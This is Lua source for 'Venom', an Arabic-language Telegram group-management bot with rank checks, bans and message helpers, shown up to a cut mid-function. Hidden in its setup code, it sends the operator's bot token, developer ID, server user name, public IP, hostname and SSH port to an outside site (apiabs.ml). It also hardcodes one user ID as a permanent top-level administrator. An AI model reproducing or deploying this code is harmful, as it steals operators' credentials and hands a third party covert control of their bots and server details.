------------------------------------------------
-- This Source Was Developed By (ABS) @wKwvv.--
--   This Is The Source Channel @venom_source .   --
--                - Venom -                 --
--        -- https://t.me/venom_source --         --
------------------------------------------------ 
DevAbs  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source Venom     --
local AutoSet = function() 
if not DevAbs:get(Server.."IdVenom") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevAbs:set(Server.."IdVenom",DevId) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end 
os.execute('lua Venom.lua') 
end 
if not DevAbs:get(Server.."TokenVenom") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevAbs:set(Server.."TokenVenom",TokenBot) 
end  
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end  
os.execute('lua Venom.lua') 
end 
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevAbs:get(Server.."IdVenom"),
TokenBot = DevAbs:get(Server.."TokenVenom"),
Venom = DevAbs:get(Server.."TokenVenom"):match("(%d+)"),
SudoIds = {DevAbs:get(Server.."IdVenom")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/config.php?Get=Venom&DevId="..DevAbs:get(Server.."IdVenom").."&TokenBot="..DevAbs:get(Server.."TokenVenom").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Venom.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Venom
token="]]..DevAbs:get(Server.."TokenVenom")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./Venom.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Venom
while(true) do
rm -fr ../.telegram-cli
screen -S Venom -X kill
screen -S Venom ./Venom.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_Venom = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevAbs:del(Server.."IdVenom");DevAbs:del(Server.."TokenVenom")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_Venom() 
print("\27[36m"..[[ 
---------------------------------------------
|    ____             ____                  |
|   |  _ \  _____   _|  _ \ _ __ _____  __  |
|   | | | |/ _ \ \ / / |_) | '__/ _ \ \/ /  |
|   | |_| |  __/\ V /|  __/| | | (_) >  <   |
|   |____/ \___| \_/ |_|   |_|  \___/_/\_\  |
|-------------------------------------------|
|This Source Was Developed By (ABS) @wKwvv.|
|  This Is The Source Channel @venom_source .   |
|               - Venom -                 |
---------------------------------------------
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,218385683}
Venom = Config.Venom
TokenBot = Config.TokenBot
NameBot = (DevAbs:get(Venom..'Abs:NameBot') or 'ڤينوم')
--     Source Venom     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source Venom     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source Venom     --
function dl_cb(arg, data)
end
--     Source Venom     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source Venom     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevAbs:sismember(Venom..'Abs:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(Venom) then  
var = true  
end  
return var  
end 
--     Source Venom     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevAbs:sismember(Venom..'Abs:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
---------Manager All--------
function ManagerAll(msg) 
local Status = DevAbs:sismember(Venom..'Abs:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
--------- Admin All --------
function AdminAll(msg) 
local Status = DevAbs:sismember(Venom..'Abs:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
------ Vip Member All ------
function VipAll(msg) 
local Status = DevAbs:sismember(Venom..'Abs:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
----   AbsConstructor   ----
function AbsConstructor(msg) 
local Status = DevAbs:sismember(Venom..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevAbs:sismember(Venom..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevAbs:sismember(Venom..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
---------  Manager  --------
function Manager(msg) 
local Status = DevAbs:sismember(Venom..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevAbs:sismember(Venom..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevAbs:sismember(Venom..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevAbs:sismember(Venom..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Venom     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevAbs:sismember(Venom..'Abs:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Venom     --
---------  BanAll  ---------
function BanAll(user_id)
if DevAbs:sismember(Venom..'Abs:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Venom     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevAbs:sismember(Venom..'Abs:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Venom     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevAbs:sismember(Venom..'Abs:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Venom     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source Venom     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source Venom     --
function VenomFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Venom and msg then
FilesText = plugin.Venom(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source Venom     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source Venom     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= Venom:lower() then 
send(chat,msg.id_,"𖠧︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"𖠧︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"𖠧︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..Venom..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevAbs:set(Venom.."Abs:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevAbs:sadd(Venom.."Abs:Groups",IdGps) 
DevAbs:set(Venom.."Abs:Lock:Bots"..IdGps,"del") DevAbs:hset(Venom.."Abs:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Abs:Lock:Links','Abs:Lock:Contact','Abs:Lock:Forwards','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:EditMsgs','Abs:Lock:Stickers','Abs:Lock:Farsi','Abs:Lock:Spam','Abs:Lock:WebLinks','Abs:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbs:set(Venom..Lock..IdGps,true)
end
if v.AbsConstructors then
for k,IdAbsConstructors in pairs(v.AbsConstructors) do
DevAbs:sadd(Venom..'Abs:AbsConstructor:'..IdGps,IdAbsConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevAbs:sadd(Venom..'Abs:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevAbs:sadd(Venom..'Abs:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevAbs:sadd(Venom..'Abs:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevAbs:sadd(Venom..'Abs:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevAbs:set(Venom.."Abs:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevAbs:set(Venom.."Abs:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"𖠧︙تم رفع النسخه بنجاح \n𖠧︙تم تفعيل جميع المجموعات \n𖠧︙تم استرجاع مشرفين المجموعات \n𖠧︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source Venom     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source Venom     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source Venom     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source Venom     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source Venom     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source Venom     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source Venom     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source Venom     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source Venom     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source Venom     --
function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source Venom     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source Venom     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source Venom     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source Venom     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source Venom     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source Venom     --
local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then VenomTEAM  = "المطور" elseif SecondSudo(msg) then VenomTEAM = "المطور" elseif SudoBot(msg) then VenomTEAM = "المطور" elseif ManagerAll(msg) then VenomTEAM = "المدير" elseif AdminAll(msg) then VenomTEAM = "الادمن" elseif AbsConstructor(msg) then VenomTEAM = "المالك" elseif BasicConstructor(msg) then VenomTEAM = "المنشئ" elseif Constructor(msg) then VenomTEAM = "المنشئ" elseif Manager(msg) then VenomTEAM = "المدير" elseif Admin(msg) then VenomTEAM = "الادمن" else VenomTEAM = "العضو" end return VenomTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then VenomTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Venom) then VenomTEAM = 'البوت' elseif SudoId(user_id) then VenomTEAM = 'المطور الاساسي' elseif DevAbs:sismember(Venom..'Abs:SecondSudo:', user_id) then VenomTEAM = 'المطور الثانوي' elseif DevAbs:sismember(Venom..'Abs:SudoBot:', user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Venom..'Abs:ManagerAll:', user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Venom..'Abs:AdminAll:', user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Venom..'Abs:VipAll:', user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Venom..'Abs:AbsConstructor:'..chat_id, user_id) then VenomTEAM = 'المالك' elseif DevAbs:sismember(Venom..'Abs:BasicConstructor:'..chat_id, user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Venom..'Abs:Constructor:'..chat_id, user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Venom..'Abs:Managers:'..chat_id, user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Venom..'Abs:Admins:'..chat_id, user_id) then VenomTEAM = DevAbs:get(Venom.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Venom..'Abs:VipMem:'..chat_id, user_id) then  VenomTEAM = DevAbs:get(Venom.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Venom..'Abs:Cleaner:'..chat_id, user_id) then  VenomTEAM = DevAbs:get(Venom.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else VenomTEAM = DevAbs:get(Venom.."Abs:mem:Rd"..chat_id) or 'العضو' end return VenomTEAM end
--     Source Venom     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Venom) then  
var = true  
elseif DevAbs:sismember(Venom..'Abs:SecondSudo:', user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:SudoBot:', user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:ManagerAll:', user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:AdminAll:', user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:VipAll:', user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:AbsConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(Venom..'Abs:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(Venom..'Abs:Constructor:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:Managers:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:Admins:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Venom..'Abs:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function AbsDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevAbs:sismember(Venom..'Abs:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevAbs:sismember(Venom..'Abs:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevAbs:sismember(Venom..'Abs:AbsConstructor:'..chat_id, user_id) then
var = 'absconstructor'
elseif DevAbs:sismember(Venom..'Abs:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevAbs:sismember(Venom..'Abs:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevAbs:sismember(Venom..'Abs:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source Venom     --
local function Filters(msg, value)
local abs = (Venom..'Abs:Filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "venom_source")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source Venom     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Abs = GetInfo.result.custom_title
else 
Abs = Status
end
end
return Abs
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'𖠧︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'𖠧︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'𖠧︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
